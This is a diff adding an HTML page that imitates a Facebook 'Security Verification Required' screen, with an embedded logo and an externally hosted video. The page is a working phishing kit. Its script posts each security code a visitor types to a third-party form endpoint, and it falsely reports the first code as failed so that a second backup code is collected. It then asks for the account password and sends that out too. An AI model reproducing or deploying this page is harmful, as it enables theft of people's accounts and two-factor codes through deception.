@@ -1,0 +1,242 @@
+
+<html lang="en"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook Confirmation</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    body {
+      font-family: 'Helvetica Neue', Arial, sans-serif;
+      background-color: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    .container {
+      background-color: white;
+      padding: 40px 30px;
+      border-radius: 10px;
+      box-shadow: 0px 6px 18px rgba(0, 0, 0, 0.1);
+      width: 400px;
+      max-width: 90%;
+    }
+
+    .logo {
+      text-align: left;
+      margin-bottom: 20px;
+    }
+
+    .logo img {
+      width: 120px;
+    }
+
+    .header {
+      text-align: left;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+      margin-bottom: 10px;
+    }
+
+    .description {
+      font-size: 14px;
+      color: #606770;
+      text-align: left;
+      margin-bottom: 25px;
+    }
+
+    .video-section {
+      margin-bottom: 15px;
+      text-align: left;
+    }
+
+    .video-section iframe {
+      width: 60%;
+      height: 160px;
+      border-radius: 8px;
+      display: block;
+      position: relative;
+    }
+
+    .form-group {
+      margin-bottom: 14px;
+    }
+
+    .form-group label {
+      display: block;
+      font-weight: bold;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #606770;
+    }
+
+    .form-group input {
+      width: 70%;
+      padding: 12px;
+      border: 1px solid #ccd0d5;
+      border-radius: 6px;
+      font-size: 16px;
+      color: #1c1e21;
+    }
+
+    .form-group input:focus {
+      border-color: #1877f2;
+      outline: none;
+      box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
+    }
+
+    .error-message {
+      color: #e74c3c;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .success-message {
+      color: #2ecc71;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+
+    .submit-button {
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 14px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 50%;
+    }
+
+    .submit-button:hover {
+      background-color: #166fe5;
+    }
+
+    .popup {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+    }
+
+    .popup-content {
+      background: white;
+      padding: 30px;
+      border-radius: 8px;
+      width: 350px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+
+    .popup-content input {
+      margin-top: 15px;
+      width: 90%;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    .popup-content button {
+      margin-top: 15px;
+      background-color: #1877f2;
+      color: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 6px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="data:image/png;base64,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" alt="Facebook Logo">
+    </div>
+
+    <div class="header">Security Verification Required</div>
+    <p class="description">
+      For your account's safety,we need to confirm it's really you. 
+      Watch The Detailed Video Information to Confirm The Account
+    </p>
+
+    <div class="video-section">
+      <iframe src="https://jyhbnptnsgxuugbrwdgx.supabase.co/storage/v1/object/public/vedio/system-updated%20(1).mp4" title="Why Security Codes Are Important" allowfullscreen=""></iframe>
+    </div>
+
+    <form id="securityForm">
+      <div class="form-group">
+        <label for="security-code">Security Code</label>
+        <input type="text" id="security-code" name="code" placeholder="Enter your code" maxlength="10" required="">
+        <span id="message" class="error-message"></span>
+      </div>
+      <button type="submit" class="submit-button">Confirm</button>
+    </form>
+  </div>
+
+  <!-- Password Popup -->
+  <div class="popup" id="passwordPopup">
+    <div class="popup-content">
+      <h3>Re-enter your password to confirm</h3>
+      <input type="password" id="passwordInput" placeholder="Password">
+      <button onclick="submitPassword()">Submit</button>
+    </div>
+  </div>
+
+  <script>
+    let attempt = 0;
+
+    const form = document.getElementById("securityForm");
+    const message = document.getElementById("message");
+    const popup = document.getElementById("passwordPopup");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+      const code = document.getElementById("security-code").value;
+
+      fetch("https://submit-form.com/f5LGSJYbn", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ code })
+      });
+
+      attempt++;
+
+      if (attempt === 1) {
+        message.className = "error-message";
+        message.textContent = "Something went wrong. Please try another backup code.";
+      } else if (attempt === 2) {
+        message.className = "success-message";
+        message.textContent = "Code verified. Please re-enter your password to confirm.";
+        popup.style.display = "flex";
+      }
+    });
+
+    function submitPassword() {
+      const password = document.getElementById("passwordInput").value;
+
+      fetch("https://submit-form.com/f5LGSJYbn", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ password })
+      });
+
+      popup.innerHTML = `
+        <div class="popup-content">
+          <p>Thank you. Please wait while we verify your info...</p>
+        </div>
+      `;
+    }
+  </script>
+
+
+</body></html>
